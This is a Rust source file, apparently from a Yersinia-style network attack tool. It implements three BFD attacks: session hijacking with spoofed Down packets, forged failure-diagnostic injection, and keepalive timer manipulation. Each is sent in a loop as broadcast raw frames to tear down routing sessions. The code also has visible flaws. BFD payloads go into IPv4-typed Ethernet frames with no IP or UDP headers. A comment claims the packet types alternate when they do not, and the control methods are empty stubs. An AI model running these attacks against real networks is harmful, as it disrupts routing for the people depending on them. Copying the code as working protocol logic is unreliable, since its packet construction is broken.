//! BFD Attack Implementations

use super::packet::{BfdDiagnostic, BfdPacket, BfdState};
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// BFD Session Hijacking Attack
#[derive(Debug, Clone)]
pub struct BfdSessionHijackAttack {
    pub my_discriminator: u32,
    pub your_discriminator: u32,
    pub spoofed_state: BfdState,
}

impl BfdSessionHijackAttack {
    pub fn new(my_disc: u32, your_disc: u32) -> Self {
        Self {
            my_discriminator: my_disc,
            your_discriminator: your_disc,
            spoofed_state: BfdState::Down,
        }
    }

    pub fn build_down_packet(&self) -> BfdPacket {
        BfdPacket::new(self.my_discriminator, self.your_discriminator)
            .with_state(BfdState::Down)
            .with_diagnostic(BfdDiagnostic::NeighborSignaledSessionDown)
    }

    pub fn build_admin_down(&self) -> BfdPacket {
        BfdPacket::new(self.my_discriminator, self.your_discriminator)
            .with_state(BfdState::AdminDown)
            .with_diagnostic(BfdDiagnostic::AdministrativelyDown)
    }
}

#[async_trait]
impl Attack for BfdSessionHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Alternate between sending Down and AdminDown packets
            let bfd_packet = self.build_down_packet();
            let bfd_bytes = bfd_packet.to_bytes();

            // BFD typically uses UDP port 3784, but we'll send raw ethernet
            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, bfd_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending BFD hijack packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "BFD Session Hijacking"
    }
}

/// BFD Fast Failure Injection Attack
#[derive(Debug, Clone)]
pub struct BfdFastFailureAttack {
    pub my_discriminator: u32,
    pub your_discriminator: u32,
    pub failure_type: FailureType,
}

#[derive(Debug, Clone, Copy)]
pub enum FailureType {
    ControlTimeout,
    EchoFailure,
    PathDown,
    ForwardingPlaneReset,
}

impl BfdFastFailureAttack {
    pub fn new(my_disc: u32, your_disc: u32) -> Self {
        Self {
            my_discriminator: my_disc,
            your_discriminator: your_disc,
            failure_type: FailureType::ControlTimeout,
        }
    }

    pub fn build_failure_packet(&self) -> BfdPacket {
        let diag = match self.failure_type {
            FailureType::ControlTimeout => BfdDiagnostic::ControlDetectionTimeExpired,
            FailureType::EchoFailure => BfdDiagnostic::EchoFunctionFailed,
            FailureType::PathDown => BfdDiagnostic::PathDown,
            FailureType::ForwardingPlaneReset => BfdDiagnostic::ForwardingPlaneReset,
        };

        BfdPacket::new(self.my_discriminator, self.your_discriminator)
            .with_state(BfdState::Down)
            .with_diagnostic(diag)
    }
}

#[async_trait]
impl Attack for BfdFastFailureAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(50);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let bfd_packet = self.build_failure_packet();
            let bfd_bytes = bfd_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, bfd_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending BFD failure packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "BFD Fast Failure Injection"
    }
}

/// BFD Keepalive Manipulation Attack
#[derive(Debug, Clone)]
pub struct BfdKeepaliveManipulationAttack {
    pub my_discriminator: u32,
    pub your_discriminator: u32,
    pub min_tx_interval: u32,
    pub min_rx_interval: u32,
    pub detect_mult: u8,
}

impl BfdKeepaliveManipulationAttack {
    pub fn new(my_disc: u32, your_disc: u32) -> Self {
        Self {
            my_discriminator: my_disc,
            your_discriminator: your_disc,
            min_tx_interval: 100000, // Very fast - 100ms
            min_rx_interval: 100000,
            detect_mult: 1, // Very aggressive
        }
    }

    pub fn build_aggressive_packet(&self) -> BfdPacket {
        let mut packet = BfdPacket::new(self.my_discriminator, self.your_discriminator)
            .with_state(BfdState::Up)
            .with_intervals(self.min_tx_interval, self.min_rx_interval);
        packet.detect_mult = self.detect_mult;
        packet
    }

    pub fn build_slow_packet(&self) -> BfdPacket {
        BfdPacket::new(self.my_discriminator, self.your_discriminator)
            .with_state(BfdState::Up)
            .with_intervals(60000000, 60000000) // Very slow - 60 seconds
    }
}

#[async_trait]
impl Attack for BfdKeepaliveManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(100);

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }

            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let bfd_packet = self.build_aggressive_packet();
            let bfd_bytes = bfd_packet.to_bytes();

            let dst_mac = MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let src_mac = MacAddress(ctx.interface.mac_address.0);

            let frame = EthernetFrame::new(dst_mac, src_mac, EtherType::IPv4, bfd_bytes);
            let frame_bytes = frame.to_bytes();

            if let Err(e) = ctx.interface.send_raw(&frame_bytes) {
                ctx.stats.increment_errors();
                eprintln!("Error sending BFD keepalive manipulation packet: {}", e);
            } else {
                ctx.stats.increment_packets_sent();
                ctx.stats.add_bytes_sent(frame_bytes.len() as u64);
            }

            time::sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "BFD Keepalive Manipulation"
    }
}
